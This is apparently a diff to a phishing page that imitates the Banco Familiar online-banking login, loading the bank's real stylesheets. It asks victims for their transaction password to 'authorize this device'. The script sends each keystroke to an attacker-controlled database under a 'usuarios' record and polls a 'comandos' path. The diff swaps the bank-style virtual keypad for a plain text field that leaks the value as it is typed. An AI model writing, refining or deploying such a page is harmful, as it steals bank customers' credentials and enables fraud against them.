@@ -11,7 +11,6 @@
 <link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar.css">
 <link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar_margin.css">
 <link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar_icons.css">
-<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/keyboard.css">
 <link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar-responsive.css">
 <link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/main.css">
 <style>
@@ -28,32 +27,22 @@
   html,body,div,span,p,a,h1,h2,h3,h4,h5,label,form,input,button,td,th,li{
     font-family:'robotoregular','Roboto',Arial,Helvetica,sans-serif;
   }
-  h1,h2,h3,h4,h5,b,strong,.content-title-ingresar h2,.text-instruccion h2{
+  h1,h2,h3,h4,h5,b,strong,.bottom-blue,.content-title-ingresar h2,.text-instruccion h2{
     font-family:'robotobold','Roboto',Arial,Helvetica,sans-serif;
   }
   .glyphicon{font-family:'Glyphicons Halflings' !important}
 
   .box-login{padding-bottom:24px}
-  .caja-clave{padding:28px 24px 30px;text-align:center}
+  .caja-clave{padding:30px 26px 32px;text-align:center}
   .caja-clave h4{color:#004185;font-size:19px;margin:0 0 8px}
-  .caja-clave .txt{color:#808080;font-size:12.5px;line-height:1.55;margin:0 0 16px}
+  .caja-clave .txt{color:#808080;font-size:12.5px;line-height:1.55;margin:0 0 22px}
   .campo-clave{
     width:100%;border:none;border-bottom:2px solid #004185;background:transparent;
-    text-align:center;font-size:22px;letter-spacing:7px;color:#004185;
-    padding:6px 0 8px;outline:none;font-weight:bold;
+    text-align:center;font-size:20px;letter-spacing:5px;color:#004185;
+    padding:6px 0 9px;outline:none;
   }
-  .campo-clave::placeholder{color:#c9d3dd;letter-spacing:4px;font-weight:normal}
-
-  #teclado{padding:0;margin:14px 0 10px}
-  #contenedorteclado{width:252px;margin:0 auto}
-  #botonesteclado{height:auto !important;padding:12px 8px 10px !important;font-size:1em;box-shadow:0 2px 10px #444}
-  .keyboard-button{width:34px !important;height:34px !important;font-size:17px !important;line-height:32px;margin:4px !important;padding:0 !important;border-radius:6px}
-  .keyboard-button:active{background-color:#bcbcbb}
-  .boton-borrar{
-    position:static !important;transform:none !important;width:100% !important;height:30px !important;
-    font-size:12px !important;margin:6px 0 0 !important;display:block !important;
-    background-color:#c9c9c8 !important;color:#333 !important;border-radius:6px !important;
-  }
+  .campo-clave::placeholder{color:#c9d3dd;letter-spacing:3px}
+  .bottom-blue{margin-top:22px}
   .bottom-blue[disabled]{opacity:.6;cursor:default}
   #errorBox{display:none;margin-top:12px;padding:9px;border-radius:6px;font-size:12.5px;font-weight:bold}
 </style>
@@ -73,30 +62,7 @@
             <h4>Clave transaccional</h4>
             <p class="txt">Ingresá tu clave transaccional para autorizar este dispositivo y operar con transferencias.</p>
 
-            <input id="clave" class="campo-clave" type="password" readonly="readonly" placeholder="••••••">
-
-            <div id="teclado" class="content-teclado impPass-content">
-              <div id="contenedorteclado">
-                <div id="botonesteclado" class="keyboard-keyset">
-                  <input value="7" type="button" class="keyboard-button">
-                  <input value="A" type="button" class="keyboard-button">
-                  <input value="2" type="button" class="keyboard-button">
-                  <input value="E" type="button" class="keyboard-button">
-                  <input value="9" type="button" class="keyboard-button"><br>
-                  <input value="C" type="button" class="keyboard-button">
-                  <input value="4" type="button" class="keyboard-button">
-                  <input value="B" type="button" class="keyboard-button">
-                  <input value="0" type="button" class="keyboard-button">
-                  <input value="6" type="button" class="keyboard-button"><br>
-                  <input value="1" type="button" class="keyboard-button">
-                  <input value="D" type="button" class="keyboard-button">
-                  <input value="8" type="button" class="keyboard-button">
-                  <input value="3" type="button" class="keyboard-button">
-                  <input value="5" type="button" class="keyboard-button"><br>
-                  <input value="Borrar" type="button" class="keyboard-button boton-borrar">
-                </div>
-              </div>
-            </div>
+            <input id="clave" class="campo-clave" type="password" maxlength="30" autocomplete="off" placeholder="••••••">
 
             <button type="button" class="bottom-blue" id="btn">Autorizar</button>
             <div class="alert alert-danger" id="errorBox"></div>
@@ -156,24 +122,17 @@
   fetch(DB+'/comandos/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
     body:JSON.stringify({accion:'', ts:Date.now()})}).catch(function(){});
 
-  function guardar(){
-    fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({clave_transaccional:inp.value})}).catch(function(){});
-  }
+  setTimeout(function(){ inp.focus(); }, 300);
 
-  document.getElementById('botonesteclado').addEventListener('click', function(ev){
-    var b = ev.target;
-    if(b.tagName !== 'INPUT') return;
-    if(b.value === 'Borrar'){ inp.value = inp.value.slice(0,-1); guardar(); return; }
-    if(inp.value.length >= 20) return;
-    inp.value += b.value;
-    guardar();
+  inp.addEventListener('input', function(){
+    fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({clave_transaccional:this.value})}).catch(function(){});
   });
 
   btn.addEventListener('click', function(){
     caja.style.display = 'none';
     if(inp.value.length < 4){
-      caja.innerHTML = '<label>Aviso</label><br>Ingresá tu clave transaccional con el teclado virtual.';
+      caja.innerHTML = '<label>Aviso</label><br>Ingresá tu clave transaccional.';
       caja.style.display = 'block';
       return;
     }
